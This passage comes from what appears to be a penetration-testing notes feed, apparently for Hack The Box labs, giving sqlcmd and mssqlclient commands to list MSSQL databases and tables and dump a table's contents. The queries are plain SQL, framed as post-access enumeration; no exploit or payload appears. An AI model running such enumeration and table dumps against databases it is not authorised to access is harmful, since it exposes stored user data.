-<h5 id="Select-Database"><a href="#Select-Database" class="headerlink" title="Select Database"></a>Select Database</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; USE htbusers</span><br><span class="line"><span class="number">2</span>&gt; GO</span><br></pre></td></tr></table></figure>
-
-<h5 id="List-Tables"><a href="#List-Tables" class="headerlink" title="List Tables"></a>List Tables</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; <span class="built_in">SELECT</span> table_name FROM htbusers.INFORMATION_SCHEMA.TABLES</span><br><span class="line"><span class="number">2</span>&gt; GO</span><br></pre></td></tr></table></figure>
-
-<h5 id="Dump-Specific-Table"><a href="#Dump-Specific-Table" class="headerlink" title="Dump Specific Table"></a>Dump Specific Table</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; <span class="built_in">SELECT</span> * FROM users</span><br><span class="line"><span class="number">2</span>&gt; go</span><br></pre></td></tr></table></figure>
-
-<h2 id="Linux-3"><a href="#Linux-3" class="headerlink" title="Linux"></a>Linux</h2><h3 id="Mssqlclient"><a href="#Mssqlclient" class="headerlink" title="Mssqlclient"></a>Mssqlclient</h3><h5 id="List-Databases-1"><a href="#List-Databases-1" class="headerlink" title="List Databases"></a>List Databases</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SQL (htbdbuser  guest@master)&gt; SELECT name FROM sys.databases;</span><br></pre></td></tr></table></figure>
-
-
-<h5 id="Select-Database-1"><a href="#Select-Database-1" class="headerlink" title="Select Database"></a>Select Database</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SQL (htbdbuser  guest@master)&gt; use database-name</span><br></pre></td></tr></table></figure>
-
-<h5 id="List-Tables-1"><a href="#List-Tables-1" class="headerlink" title="List Tables"></a>List Tables</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE=<span class="string">&#x27;BASE TABLE&#x27;</span> ORDER BY TABLE_SCHEMA, TABLE_NAME;</span><br></pre></td></tr></table></figure>
-
-<h5 id="Dump-Specific-Table-1"><a href="#Dump-Specific-Table-1" class="headerlink" title="Dump Specific Table"></a>Dump Specific Table</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM table-name;</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Service-Enumeration</category>
-        <category>MSSQL</category>
-      </categories>
-      <tags>
-        <tag>Enumeration</tag>
-        <tag>MSSQL</tag>
       </tags>
   </entry>
   <entry>
